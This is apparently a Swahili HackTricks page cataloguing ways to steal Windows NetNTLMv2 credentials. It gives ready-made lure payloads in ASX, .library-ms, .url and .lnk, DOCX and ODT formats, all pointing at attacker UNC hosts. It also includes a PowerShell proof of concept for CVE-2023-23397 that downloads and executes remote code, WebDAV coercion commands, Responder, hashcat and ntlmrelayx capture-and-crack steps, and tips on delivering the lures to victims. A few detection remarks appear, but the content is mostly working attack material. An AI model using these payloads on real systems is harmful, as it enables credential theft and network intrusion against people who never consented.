# Maeneo ya kuiba vitambulisho vya NTLM

{{#include ../../banners/hacktricks-training.md}}

**Angalia mawazo yote mazuri kutoka [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/), kuanzia kupakua faili la Microsoft Word mtandaoni hadi chanzo cha uvujaji wa NTLM: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md na [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### SMB share inayoweza kuandikwa + vivutio vya UNC vinavyoanzishwa na Explorer (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Ikiwa unaweza **kuandika kwenye share ambayo watumiaji au kazi zilizoratibiwa huvinjari katika Explorer**, weka faili ambazo metadata yake inaelekeza kwenye UNC yako (kwa mfano, `\\ATTACKER\share`). Kuonyesha yaliyomo kwenye folda husababisha **uthibitishaji wa SMB usio wa moja kwa moja** na kuvuja kwa **NetNTLMv2** kwa msikilizaji wako.<sup>[[1]](#references)</sup>

1. **Tengeneza vivutio** (inajumuisha SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/n.k.)

```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```

2. **Ziweke kwenye share inayoweza kuandikwa** (folda yoyote ambayo mwathiriwa hufungua):

```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```

3. **Sikiliza na vunja**:

```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```

Windows inaweza kufikia faili kadhaa kwa wakati mmoja; chochote ambacho Explorer huonyesha hakikisho (`BROWSE TO FOLDER`) hakihitaji mibofyo.

### Orodha za kucheza za Windows Media Player (.ASX/.WAX)

Ukimfanya mlengwa afungue au aonyeshe hakikisho la orodha ya kucheza ya Windows Media Player unayodhibiti, unaweza leak Net-NTLMv2 kwa kuelekeza ingizo kwenye njia ya UNC. WMP itajaribu kupata media iliyorejelewa kupitia SMB na itajithibitisha kimyakimya.<sup>[[3]](#references)[[4]](#references)</sup>

Mfano wa payload:

```xml
<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title></title>
    <ref href="file://ATTACKER_IP\\share\\track.mp3" />
  </entry>
</asx>
```

Mtiririko wa ukusanyaji na cracking:

```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer hushughulikia .library-ms kwa njia isiyo salama inapofunguliwa moja kwa moja kutoka ndani ya kumbukumbu ya ZIP. Ikiwa ufafanuzi wa library unaelekeza kwenye njia ya mbali ya UNC (k.m., \\attacker\share), kuvinjari au kuzindua tu .library-ms iliyo ndani ya ZIP husababisha Explorer kuorodhesha yaliyomo kwenye UNC na kutuma uthibitishaji wa NTLM kwa mshambuliaji. Hii hutoa NetNTLMv2 inayoweza kupasuliwa offline au, pengine, relay.<sup>[[2]](#references)</sup>

Minimal .library-ms inayoelekeza kwenye UNC ya mshambuliaji

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <version>6</version>
  <name>Company Documents</name>
  <isLibraryPinned>false</isLibraryPinned>
  <iconReference>shell32.dll,-235</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.2\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

Hatua za utekelezaji
- Unda faili la .library-ms ukitumia XML iliyo hapo juu (weka IP/hostname yako).
- Liweke kwenye ZIP (kwenye Windows: Send to → Compressed (zipped) folder) na utume ZIP kwa mlengwa.
- Endesha NTLM capture listener na usubiri mwathiriwa afungue .library-ms kutoka ndani ya ZIP.


### Njia ya sauti ya ukumbusho wa kalenda ya Outlook (CVE-2023-23397) – Net-NTLMv2 leak bila kubofya

Microsoft Outlook for Windows ilichakata sifa ya extended MAPI PidLidReminderFileParameter katika vipengee vya kalenda. Sifa hiyo ikielekeza kwenye UNC path (kwa mfano, \\attacker\share\alert.wav), Outlook iliwasiliana na SMB share ukumbusho ulipoanza, na kusababisha Net-NTLMv2 ya mtumiaji kuvuja bila kubofya chochote. Tatizo hili lilirekebishwa Machi 14, 2023, lakini bado ni muhimu sana kwa mifumo ya zamani/isiyosasishwa na kwa uchunguzi wa matukio ya kihistoria.<sup>[[5]](#references)</sup>

Unyonyaji wa haraka kwa kutumia PowerShell (Outlook COM):

```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```

Upande wa Listener:

```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```

Maelezo
- Mwathiriwa anahitaji tu Outlook for Windows iwe inaendeshwa wakati reminder inapoanzishwa.
- leak hutoa Net‑NTLMv2 inayofaa kwa offline cracking au relay (si pass-the-hash).


### .LNK/.URL icon-based zero-click NTLM leak (CVE‑2025‑50154 – bypass ya CVE‑2025‑24054)

Windows Explorer huonyesha ikoni za shortcut kiotomatiki. Utafiti wa hivi karibuni ulionyesha kuwa hata baada ya Microsoft kutoa kiraka cha Aprili 2025 cha shortcut zenye ikoni za UNC, bado iliwezekana kuanzisha authentication ya NTLM bila mibofyo yoyote kwa kuweka target ya shortcut kwenye UNC path na kuacha ikoni ikiwa local (bypass ya kiraka ilipewa CVE‑2025‑50154). Kuangalia tu folder husababisha Explorer kupata metadata kutoka kwa target ya remote, na kutuma NTLM kwa SMB server ya mshambuliaji.<sup>[[6]](#references)</sup>

Payload ndogo ya Internet Shortcut (.url):

```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```

Kuprogramu payload ya njia ya mkato (.lnk) kupitia PowerShell:

```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```

Mawazo ya uwasilishaji
- Weka shortcut ndani ya ZIP na umfanye mwathiriwa aifungue.
- Weka shortcut kwenye share inayoweza kuandikiwa ambayo mwathiriwa ataifungua.
- Iunganishe na faili nyingine za kuvutia kwenye folda hiyo hiyo ili Explorer ionyeshe vivyo hivyo.

### .LNK leak ya NTLM bila kubofya kupitia njia ya ikoni ya ExtraData (CVE‑2026‑25185)

Windows hupakia metadata ya `.lnk` wakati wa **kuonyesha/kuhakiki** (kuchora ikoni), si wakati wa kuiendesha pekee. CVE‑2026‑25185 inaonyesha njia ya uchanganuzi ambapo vitalu vya **ExtraData** husababisha shell kutafuta njia ya ikoni na kufikia mfumo wa faili **wakati wa kupakia**, na hivyo kutuma NTLM nje iwapo njia hiyo ni ya mbali.

Masharti muhimu ya kichochezi (yaliyoonekana kwenye `CShellLink::_LoadFromStream`):
- Jumuisha **DARWIN_PROPS** (`0xa0000006`) kwenye ExtraData (sharti la kufikia utaratibu wa kusasisha ikoni).
- Jumuisha **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) huku **TargetUnicode** ikiwa na thamani.
- Kipakiaji hupanua vigezo vya mazingira kwenye `TargetUnicode` na kuita `PathFileExistsW` kwenye njia inayotokana.

Ikiwa `TargetUnicode` itasuluhishwa kuwa njia ya UNC (kwa mfano, `\\attacker\share\icon.ico`), **kutazama tu folda** iliyo na shortcut husababisha uthibitishaji wa kutoka kwenda nje. Njia hiyo hiyo ya upakiaji inaweza pia kufikiwa na **indexing** na **uchanganuzi wa AV**, na kuifanya kuwa sehemu ya vitendo ya leak isiyohitaji kubofya.<sup>[[7]](#references)</sup>

Zana za utafiti (parser/generator/UI) zinapatikana kwenye mradi wa **LnkMeMaybe** ili kuunda/kukagua miundo hii bila kutumia GUI ya Windows.<sup>[[8]](#references)</sup>


### Kulazimisha uthibitishaji wa WebDAV / kuthibitisha credentials kupitia `davclnt.dll,DavSetCookie`

**Mteja wa WebDAV** wa asili anaweza kutumiwa kulazimisha kipindi cha sasa cha kuingia kuthibitisha utambulisho wake kwa endpoint yoyote ya **HTTP/WebDAV**:

```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```

Kwa nini hii ni muhimu:
- Dhidi ya **WebDAV server inayodhibitiwa na mshambuliaji**, inaweza kusababisha **NTLM kupitia HTTP** bila kupeleka client maalum.
- Dhidi ya **hosts za ndani**, ni njia tulivu ya **kuthibitisha mahali ambapo credentials zilizoibwa zinakubaliwa** kabla ya kusonga baadaye kwenye mtandao.<sup>[[9]](#references)</sup>
- Amri hii ni mbadala mzuri wakati **SMB egress imechujwa** lakini **HTTP/WebDAV** bado inafikika.

Vidokezo vya matumizi:
- Huduma ya **WebClient** lazima iwe inaendeshwa kwenye host ya chanzo.
- `rundll32.exe` hupakia `davclnt.dll` na kuifanya Windows ishughulikie uthibitishaji wa WebDAV kwa kutumia **credentials za mtumiaji wa sasa**.<sup>[[10]](#references)</sup>
- Ukiielekeza kwenye miundombinu unayodhibiti, tumia HTTP listener/relay inayotambua NTLM kama vile:

```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```

Kwa mtazamo wa ugunduzi, kurudiwa kwa utekelezaji wa `rundll32.exe davclnt.dll,DavSetCookie` dhidi ya mifumo mingi ya ndani ni ishara thabiti ya **uthibitishaji wa credentials / maandalizi ya lateral movement yanayofanana na spray**, badala ya tabia ya kawaida ya mtumiaji.<sup>[[9]](#references)[[11]](#references)</sup>

### URI za arifa za mbali za WebDAV NTLM coercion

Ikiwa programu inafungua anwani za popup au web-view zilizosanidiwa kwa mbali, anwani ya `file://` inaweza kulazimisha uthibitishaji wa nje **bila kufungua hati au kutumia executable payload**. Katika tukio la AOMEI, arifa ya pikseli moja ilielekeza kwenye njia ya mbali ya WebDAV ya `DavWWWRoot`. Windows ilijaribu kutumia integrated authentication kwenye anwani hiyo, na kufichua challenge-response ya NetNTLMv2. Kichocheo kilikuwa kufunguliwa kwa URI, si kuonekana kwa popup; bado hutegemea URI handler ya programu, [tabia ya Windows WebClient](../../network-services-pentesting/pentesting-web/put-method-webdav.md#client-side-webdav-delivery-and-execution), na sera ya uthibitishaji wa nje.<sup>[[16]](#references)</sup>

```ini
[PopWindow1]
Address="file://<ATTACKER_IP>/DavWWWRoot/campaign/24hour-flash-sale.html"
Width=1
Height=1
Priority=9999
```

Tofauti na coercion inayotegemea command hapo juu, sehemu hii ya kuingilia inahitaji udhibiti wa [usanidi wa arifa za software](../windows-local-privilege-escalation/abusing-auto-updaters-and-ipc.md#notification-configuration-as-a-second-update-trigger). Dirisha la pikseli moja na kipaumbele cha juu vinaonyesha kuwa arifa isiyovutia bado inaweza kusababisha client kufuatilia URI.<sup>[[16]](#references)</sup>

### Office remote template injection (.docx/.dotm) ili kulazimisha NTLM

Hati za Office zinaweza kurejelea template ya nje. Ukiweka template iliyoambatishwa kuwa njia ya UNC, kufungua hati kutasababisha uthibitishaji kupitia SMB.

Mabadiliko madogo ya DOCX relationship (ndani ya word/):

1) Hariri word/settings.xml na uongeze rejeleo la template iliyoambatishwa:

```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```

2) Hariri word/_rels/settings.xml.rels na uelekeze rId1337 kwenye UNC yako:

```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```

3) Pakia upya kuwa .docx na uwasilishe. Endesha SMB capture listener yako na usubiri faili lifunguliwe.

### Kitu cha nje cha ODT kwa uthibitishaji wa SMB

Wakati njia ya kupakia hati inapokubali `.odt` lakini lengwa halifungui faili za Office `.docx`, tumia kitu cha nje cha OpenDocument badala ya template ya Office. Metasploit's `auxiliary/fileformat/odt_badodt` hutengeneza ODT ambayo `content.xml` yake ina rejeleo la `draw:object` la kufunguliwa wakati wa kupakia, kama lililo hapa chini. Weka `LHOST` iwe anwani ya SMB listener, pakia ODT kupitia workflow inayoruhusiwa, kisha capture jibu la nje la NetNTLMv2 mtumiaji au kichakataji hati kinapolifungua. Ukaguzi wa kiendelezi cha jina la faili haukagui URL iliyopachikwa; vizuizi vya inbound NTLM kwenye lengwa huenda visizuie uthibitishaji wa outbound.<sup>[[15]](#references)</sup>

```xml
<draw:object xlink:href="file://<attacker-ip>/test.jpg" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
```

Kwa mawazo ya baada ya capture kuhusu relaying au kutumia vibaya NTLM, angalia:

{{#ref}}
README.md
{{#endref}}


## References
- [1] [HTB: Breach – Mitego ya share inayoweza kuandikwa + capture ya Responder → crack ya NetNTLMv2 → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – auth leak kupitia ZIP .library‑ms (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 hadi DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — NTLM leak ya WMP → NTFS junction hadi webroot RCE → FullPowers + GodPotato hadi SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – Vulnerability 5 za NTLM: Vitisho vya privilege escalation visivyotiwa patch katika Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft inapunguza Outlook EoP (CVE‑2023‑23397) na kueleza NTLM leak kupitia PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero‑click, NTLM moja: Bypass ya security patch ya Microsoft (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: Tathmini ya CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [Zana za TrustedSec LnkMeMaybe](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – Wakati IT Support Inapopiga Simu: Kuchambua kampeni ya ModeloRAT kutoka Teams hadi Domain Compromise](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – Kichwa cha davclnt.h](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – Ombi la Windows Rundll32 WebDAV](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com - Maeneo ya Kuvutia kwa Kuiba Netntlm Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [15] [HTB: Hercules — capture ya NTLM kupitia external-object ya ODT](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
- [16] [Google Threat Intelligence Group and Mandiant – Kuchunguza Uharibifu wa Muda Mfupi wa Supply Chain](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
